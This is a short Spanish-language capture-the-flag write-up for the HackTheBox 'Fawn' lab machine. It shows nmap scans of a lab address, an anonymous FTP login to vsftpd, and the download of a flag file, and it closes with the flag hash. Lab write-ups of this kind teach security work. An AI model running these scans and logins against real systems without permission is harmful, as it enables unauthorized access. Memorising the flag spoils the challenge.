---
titulo: "Fawn"
descripcion: "Acceso a servidor FTP con login anónimo habilitado para descargar flag expuesto en el directorio raíz."
fecha: 2026-05-12
dificultad: easy
herramientas: ["nmap", "ftp"]
categoria: htb
plataforma: HackTheBox
completado: true
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.196.140
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p21 10.129.196.140 -sCV
```

Puerto abierto: **21/tcp (vsftpd 3.0.3)**

El script `ftp-anon` de nmap confirma login anónimo habilitado y lista `flag.txt` en el directorio raíz.

## Foothold

Conexión FTP con usuario `anonymous` sin contraseña:

```bash
ftp 10.129.196.140
# Name: anonymous
# Password: (vacío o cualquier email)
```

Si `ls` no responde, activar modo pasivo primero:

```bash
passive
ls
get flag.txt
```

## Flags

| Flag | Hash |
|------|------|
| Root | `035db21c881520061c53e0536e44f815` |
